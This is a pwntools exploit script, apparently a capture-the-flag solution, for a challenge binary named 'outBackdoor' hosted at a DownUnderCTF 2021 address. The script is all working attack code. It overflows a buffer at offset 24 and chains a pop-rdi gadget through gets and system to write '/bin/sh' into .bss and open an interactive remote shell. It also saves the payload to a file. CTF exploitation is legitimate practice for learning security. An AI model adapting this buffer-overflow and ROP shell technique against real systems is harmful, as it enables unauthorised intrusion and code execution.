from pwn import *

elf = ELF('outBackdoor')
context.update(binary=elf, log_level='critical')

host = 'pwn-2021.duc.tf'
port = 31921

pop_rdi = 0x40125b
bss = 0x404100

p = remote(host, port)
# p = elf.process()

binsh = next(elf.search(b'/bin/sh'))

offset = 24
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(elf.plt['gets'])
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(elf.plt['system'])

with open('payload', 'wb') as fp:
	fp.write(payload + b'\n')

p.recvuntil(b'song?\n')
p.sendline(payload)
p.sendline(b'/bin/sh')
p.interactive()

p.close()
